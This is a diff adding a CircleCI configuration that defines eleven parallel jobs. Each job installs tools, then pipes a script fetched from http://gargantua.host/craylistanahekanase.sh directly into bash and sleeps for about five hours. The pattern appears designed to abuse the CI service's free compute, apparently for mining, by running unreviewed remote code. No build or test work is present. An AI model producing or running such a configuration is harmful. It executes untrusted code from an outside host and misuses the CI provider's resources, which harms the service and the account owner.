@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  pythruntm:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  pythruntm10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanase.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - pythruntm
+      - pythruntm1
+      - pythruntm2
+      - pythruntm3
+      - pythruntm4
+      - pythruntm5
+      - pythruntm6
+      - pythruntm7
+      - pythruntm8
+      - pythruntm9
+      - pythruntm10
